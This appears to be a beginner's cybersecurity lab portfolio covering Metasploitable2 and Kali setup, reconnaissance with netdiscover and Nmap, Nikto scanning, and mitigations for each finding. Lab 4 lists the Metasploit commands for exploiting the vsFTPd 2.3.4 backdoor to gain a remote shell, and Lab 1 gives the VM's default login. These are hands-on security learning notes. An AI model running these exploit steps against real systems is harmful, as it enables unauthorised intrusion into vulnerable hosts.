# Cybersecurity Labs Portfolio 

Welcome to my hands-on cybersecurity lab portfolio!  
This is where I document everything I'm practicing — from virtual labs to tools like Nmap, Wireshark, Metasploit, and more.

- ## 📚 Table of Contents

- [🔥 Lab 1: Metasploitable2 Setup](#lab-1-metasploitable2-setup-vulnerable-machine-for-testing)
- [🧠 Lab 2: Nmap Scan on Metasploitable2](#lab-2-nmap-scan-on-metasploitable2)
- [🧪 Lab 3: Wireshark Packet Capture](#lab-3-wireshark-packet-capture)
- [🚨 Lab 4: Metasploit Exploit Demo](#lab-4-metasploit-exploit-demo)
- [🔐 What’s Next](#whats-next)


##  Lab 1: Metasploitable2 Setup (Vulnerable Machine for Testing)

Tool Used: VirtualBox  
System: Metasploitable2 (Ubuntu 2.6.24)  
Status:  Completed

###  What I Did:
- Imported the Metasploitable2 VM into VirtualBox
- Configured network settings (NAT and Host-only for Kali interaction)
- Logged in with default credentials: msfadmin/msfadmin
- Verified system status:
  ```bash
  ip a
  uname -a


# Lab 2: Kali Linux Setup and Reconnaissance  

## 1) Goal  
Set up Kali Linux in VirtualBox and perform basic network reconnaissance to identify the Metasploitable2 target.  

## 2) Environment  
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 (VirtualBox Image)  
- Target: Metasploitable2 (Ubuntu 2.6.24)  
- Network: Host-only (192.168.56.0/24)  

## 3) Steps & Commands  

*What I Did:*  
- Installed Kali Linux VM in VirtualBox  
- Connected it to the same network as Metasploitable2  
- Discovered Metasploitable2’s IP address  

*Verified system status:*  
```bash
ip a
uname -a

Network discovery with Netdiscover:

netdiscover -r 192.168.56.0/24

Basic Nmap scan:

nmap -sS [target_IP]


4) Results & Screenshots
	•	ip a confirmed Kali network interface up and running.
	•	netdiscover revealed Metasploitable2 IP (e.g., 192.168.56.101).
	•	Nmap detected several open ports (21 - FTP, 22 - SSH, 23 - Telnet, 80 - HTTP, 3306 - MySQL).

 Add screenshots here:
	•	ip a output
	•	netdiscover IP discovery
	•	Nmap scan results

5) Findings & Mitigation
	•	Telnet (23/tcp) open → insecure plaintext protocol.
	•	Mitigation: Disable Telnet, use SSH instead.
	•	FTP (21/tcp) allows anonymous login → risk of unauthorized access.
	•	Mitigation: Disable anonymous login, enforce authentication.


6) Reflection

This lab taught me how to:
	•	Successfully install and configure Kali Linux in VirtualBox.
	•	Connect Kali to the same host-only network as Metasploitable2.
	•	Use netdiscover for reconnaissance and Nmap for port scanning.

# Lab 3: Vulnerability Scanning with Nmap and Nikto  

## 1) Goal  
Perform deeper vulnerability scanning by:  
- Using *Nmap* for service and version detection.  
- Running *Nikto* to identify web server vulnerabilities.  

## 2) Environment  
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 VM  
- Target: Metasploitable2 (Ubuntu 2.6.24)  
- Network: Host-only (192.168.56.0/24)  

## 3) Steps & Commands  

*Service and version detection with Nmap:*  
```bash
nmap -sV [target_IP]

Web vulnerability scanning with Nikto:

nikto -h http://[target_IP]


4) Results & Screenshots
	•	Nmap Results:
	•	Detected services and versions (Apache HTTPD 2.x, MySQL, vsFTPd).
	•	Confirmed target is running multiple outdated services.
	•	Nikto Results:
	•	Found potential vulnerabilities (e.g., outdated Apache server, directory indexing enabled, insecure HTTP headers).
	•	Reported multiple findings with severity levels.

 Add screenshots here:
	•	Nmap scan output
	•	Nikto scan results



5) Findings & Mitigation
	•	Apache HTTPD outdated → risk of known exploits.
	•	Mitigation: Upgrade to latest stable Apache version.
	•	Directory indexing enabled → information disclosure.
	•	Mitigation: Disable directory listing in Apache config.
	•	Missing security headers → weak against XSS/Clickjacking.
	•	Mitigation: Add X-Frame-Options, X-Content-Type-Options, CSP headers.


6) Reflection

This lab helped me move from basic reconnaissance (Lab 2) to detailed vulnerability analysis:
	•	Learned how Nmap’s -sV option reveals software versions.
	•	Used Nikto to identify common web vulnerabilities.
	•	Understood how to map results to real-world mitigations.


# Lab 4: Exploitation Using Metasploit  

## 1) Goal  
Demonstrate exploitation of a vulnerable service (vsFTPd 2.3.4 backdoor) on Metasploitable2 using the Metasploit Framework.  

## 2) Environment  
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 VM  
- Target: Metasploitable2 (Ubuntu 2.6.24 VM)  
- Tool: Metasploit Framework (msfconsole)  

## 3) Steps & Commands  

*Launched Metasploit Framework:*  
```bash
msfconsole

Searched for available exploits:

search vsftpd

Selected and configured exploit module:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [target_IP]
exploit

Interacted with the session (if successful):

sessions -i 1
whoami
uname -a


4) Results & Screenshots
	•	Successfully launched Metasploit and selected the vsFTPd 2.3.4 exploit.
	•	Exploit executed → gained remote shell access to Metasploitable2.
	•	Verified access using whoami and uname -a.

Add screenshots here:
	•	Metasploit module loaded
	•	Exploit success message
	•	Proof of shell access on target


5) Findings & Mitigation
	•	Finding: vsFTPd 2.3.4 is vulnerable due to a known backdoor.
	•	Mitigation: Upgrade or disable the vulnerable FTP service.
	•	Finding: Exposed FTP service was accessible on the network.
	•	Mitigation: Restrict access with firewall rules and enforce strong authentication.



6) Reflection

This lab taught me how to:
	•	Use Metasploit to search, select, and execute exploit modules.
	•	Understand how scanning (Lab 2–3) leads to exploitation (Lab 4).
	•	Recognize the importance of patch management and disabling unused services.



Stay tuned! 
 
 
